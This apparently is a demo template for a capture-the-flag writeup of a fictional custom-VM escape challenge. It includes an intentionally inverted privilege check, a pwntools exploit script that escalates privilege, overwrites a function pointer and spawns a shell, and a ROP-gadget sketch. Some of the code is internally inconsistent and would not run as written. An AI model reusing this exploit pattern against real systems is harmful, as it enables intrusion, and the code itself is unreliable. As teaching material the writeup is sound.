---
title: "Demo VM Escape Challenge"
date: 2024-01-25T20:15:00Z
category: "ctf"
tags: ["demo", "template", "vm-escape", "reversing"]
challenge_category: "rev"
challenge_points: 350
challenge_solves: 23
summary: "Demo template for VM escape writeups - demonstrates proper formatting and structure."
ctf_name: "Demo CTF"
---

# Demo VM Escape Challenge - Demo CTF

**Category**: rev
**Points**: 350
**Solves**: 23

*This is a demo template showing the proper structure for VM escape/custom architecture CTF writeups.*

## Challenge Description

```
[Challenge description from CTF organizers]

nc challenge.example.com 1337
```

**Files**: `vm_engine`, `firmware.bin`

## Initial Analysis

```bash
$ file vm_engine
vm_engine: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ file firmware.bin
firmware.bin: data
```

## VM Architecture Analysis

After reverse engineering the VM engine, document the custom architecture:

### VM State Structure

```c
struct vm_state {
    uint16_t registers[16];    // R0-R15
    uint16_t pc;              // Program counter
    uint16_t sp;              // Stack pointer
    uint8_t  flags;           // Status flags
    uint8_t  memory[0x10000]; // 64KB memory space
    uint8_t  privilege;       // 0=user, 1=supervisor
};
```

### Instruction Set Architecture

Document the custom instruction set:

```assembly
# Arithmetic Operations
ADD  R1, R2, R3    # R1 = R2 + R3
SUB  R1, R2, R3    # R1 = R2 - R3
MUL  R1, R2, R3    # R1 = R2 * R3

# Memory Operations
LOAD  R1, [R2]     # R1 = memory[R2]
STORE [R1], R2     # memory[R1] = R2
LOADI R1, #imm     # R1 = immediate

# Control Flow
JMP   addr         # Jump to address
JEQ   R1, R2, addr # Jump if R1 == R2
CALL  addr         # Call subroutine
RET                # Return from subroutine

# System Operations
SYSCALL #num       # System call
PRIVESC            # Privilege escalation instruction
```

## Vulnerability Analysis

Identified vulnerabilities in the VM implementation:

1. **Privilege Check Bug**: Logic error in privilege escalation validation
2. **Memory Protection Bypass**: Supervisor mode allows access to host memory
3. **VM-to-Host Escape**: Memory-mapped regions provide interface to host

Example vulnerable code:

```c
// In vm_execute_instruction()
case OPCODE_PRIVESC:
    if (vm->privilege == 0) {
        // BUG: Inverted check allows escalation
        if (vm->registers[0] != MAGIC_VALUE) {
            vm->privilege = 1;  // Grants supervisor!
        }
    }
    break;
```

## Exploitation Strategy

High-level plan:

1. **Trigger Privilege Escalation**: Exploit buggy privilege check
2. **Memory Mapping Discovery**: Explore supervisor memory regions
3. **Code Injection**: Overwrite function pointers to gain host execution
4. **Shell Escape**: Execute system commands on the host

## Exploitation Implementation

VM assembler and exploit:

```python
#!/usr/bin/env python3

# VM Assembler for the custom architecture
class VMAssembler:
    OPCODES = {
        'ADD': 0x01, 'SUB': 0x02, 'MUL': 0x03,
        'LOAD': 0x10, 'STORE': 0x11, 'LOADI': 0x12,
        'JMP': 0x20, 'JEQ': 0x21, 'JNE': 0x22,
        'CALL': 0x30, 'RET': 0x31,
        'SYSCALL': 0x40, 'PRIVESC': 0x41,
        'NOP': 0x00, 'HALT': 0xFF
    }

    def assemble(self, code):
        bytecode = bytearray()

        for line in code.strip().split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            parts = line.replace(',', ' ').split()
            opcode = self.OPCODES[parts[0]]
            bytecode.append(opcode)

            # Add operands based on instruction type
            for i in range(1, min(4, len(parts))):
                if parts[i].startswith('R'):
                    bytecode.append(int(parts[i][1:]))
                elif parts[i].startswith('#'):
                    val = int(parts[i][1:], 0)
                    bytecode.append(val & 0xFF)
                    bytecode.append((val >> 8) & 0xFF)
                else:
                    val = int(parts[i], 0)
                    bytecode.append(val & 0xFF)
                    bytecode.append((val >> 8) & 0xFF)

            # Pad instruction to 4 bytes
            while len(bytecode) % 4 != 0:
                bytecode.append(0)

        return bytes(bytecode)

# Exploit payload
exploit_asm = """
# Initialize registers
LOADI R0, #0x1338      # Wrong value to trigger bug
LOADI R1, #0xF008      # Address of system function pointer

# Trigger privilege escalation bug
PRIVESC

# Now in supervisor mode - write shellcode
LOADI R2, #0x2F62696E  # "/bin" in little endian
LOADI R3, #0x68732F    # "/sh" in little endian
STORE [#0x9000], R2
STORE [#0x9004], R3

# Overwrite function pointer
LOADI R4, #0x9010
STORE [R1], R4

# Write native shellcode bytes
# (shellcode to execute system("/bin/sh"))

# Trigger the overwritten function pointer
SYSCALL #1
"""

def exploit():
    assembler = VMAssembler()
    bytecode = assembler.assemble(exploit_asm)

    print(f"[*] Generated {len(bytecode)} bytes of VM bytecode")

    # Connect to target
    from pwn import *

    p = remote('challenge.example.com', 1337)

    # Send bytecode
    p.sendlineafter(b'Firmware size: ', str(len(bytecode)).encode())
    p.send(bytecode)

    print("[*] Firmware uploaded, triggering exploit...")

    # The VM should execute our code and give us a shell
    p.interactive()

if __name__ == '__main__':
    exploit()
```

## Alternative Approach: ROP in VM Space

For more elegant exploitation, use ROP gadgets within the VM's own code:

```python
# Find ROP gadgets in the VM firmware
def find_gadgets(firmware):
    gadgets = {}

    # Search for useful instruction sequences
    for i in range(len(firmware) - 8):
        # Look for: LOAD R1, [R2]; RET sequence
        if firmware[i:i+4] == b'\x10\x01\x02\x00':
            if firmware[i+4:i+8] == b'\x31\x00\x00\x00':
                gadgets['load_ret'] = i

        # Look for: STORE [R1], R2; RET sequence
        if firmware[i:i+4] == b'\x11\x01\x02\x00':
            if firmware[i+4:i+8] == b'\x31\x00\x00\x00':
                gadgets['store_ret'] = i

    return gadgets

# Build ROP chain using found gadgets
def build_rop_chain(gadgets):
    rop_chain = [
        gadgets['load_ret'],   # Load system address
        0xF008,                # From function pointer location
        gadgets['store_ret'],  # Store to register
        0x9100,                # Temporary storage
        # ... more ROP gadgets
    ]

    return rop_chain
```

## Key Insights

- Custom VM analysis requires understanding both VM architecture and host implementation
- Privilege escalation bugs in VMs can lead to complete sandbox escapes
- Memory-mapped regions often provide interfaces between VM and host
- VM-to-host escapes typically involve overwriting function pointers
- ROP techniques can be adapted to work within custom architectures

## Mitigation

Recommended mitigations:
- Proper privilege checking logic (avoid inverted conditions)
- Strict memory isolation between VM and host
- Address space layout randomization for VM memory regions
- Hardware-assisted virtualization features when possible
- Regular security audits of VM implementations

---

**Flag**: `FLAG{demo_vm_escape_flag}`
